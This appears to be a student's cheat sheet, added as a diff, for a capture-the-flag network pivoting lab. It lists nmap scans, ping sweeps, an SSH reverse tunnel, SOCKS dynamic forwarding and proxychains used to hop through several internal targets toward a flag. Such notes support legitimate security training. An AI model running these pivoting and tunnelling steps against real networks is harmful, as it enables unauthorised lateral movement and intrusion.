@@ -1,0 +1,46 @@
+Internet-Host
+  nmap -Pn -T4 -v <target1> -p 21-23,80
+  nc <target1> <port>
+  wget -r <target1> 
+  cat or eog files 
+  Telnet or SSH to target
+Target1
+  ip a
+  ip n
+  ip r
+  ss -ntlp
+  for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done
+  ss -antp (verify how device sees you)
+  ssh student@internet-host -R 50499:127.0.0.1:22 -NT 
+Internet-Host
+  nc 127.0.0.1 50499 (test connection)
+  ssh Rick@127.0.0.1 -p 50499
+  ssh Rick@127.0.0.1 -p 50499 -D 9050 -NT 
+Internet-Host
+  proxychains nmap ..... <new targets>
+  proxychains nc ....
+  proxychains wget -r .....
+  ssh Rick@127.0.0.1 -p 50499 -L 50400:target2:sshPort -NT
+  ssh to target2
+Target2
+  Enumerate!!!
+Internet Host
+  Recreate dynamic port
+  ssh Morty@127.0.0.1 -p 50400 -D 9050 -NT
+Internet Host
+  proxychains ..... new targets
+  ssh Morty@127.0.0.1 -p 50400 -L 50401:target3:sshPort -NT
+  ssh to target3
+Target3
+  Enumerate!!!!!!!
+Internet Host
+  Recreate dynamic port
+  ssh Jerry@127.0.0.1 -p 50401 -D 9050 -NT
+Internet Host
+  proxychains ..... new targets
+Internet Host
+  Recreate dynamic port
+  ssh Beth@127.0.0.1 -p 50402 -D 9050 -NT
+proxychains nc 127.0.0.1 <port> (to find flag)
+  
+  
